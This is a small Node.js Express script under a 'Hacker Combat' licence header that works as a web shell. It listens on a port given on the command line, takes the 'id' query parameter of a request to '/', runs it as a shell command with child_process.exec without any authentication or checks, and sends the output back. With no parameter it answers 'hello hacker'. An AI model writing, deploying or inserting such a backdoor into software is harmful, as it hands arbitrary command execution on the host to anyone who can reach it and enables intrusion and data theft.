/*
Copyright 2014-Present Hacker Combat Authors
This file is part of the Hacker Combat library.
The Hacker Combat Protocol is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
The Hacker Combat Protocol is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Lesser General Public License for more details.
You should have received a copy of the GNU Lesser General Public License
along with the Hacker Combat Protocol library. If not, see <http://www.gnu.org/licenses/>.
*/
var express = require("express");
var app = express();
var exec = require('child_process').exec;
var cmd = "pwd ; ls"
process.argv.forEach(function (val, index, array) {
  console.log(index + ': ' + val);
});
app.get('/', function(req, res){
    console.log("I have been successfully pinged")
    console.log('id: ' + req.query.id);
    cmd = req.query.id;
    if(cmd == undefined){
      cmd = "whoami"
      console.log("cmd"+cmd)
      res.send("hello hacker");
    }else{
      exec(cmd, function(error, stdout, stderr) {
        // command output is in stdout
        console.log("stdout: "+stdout)
        res.send(stdout);
      });
    }
});
app.listen(process.argv[2]);
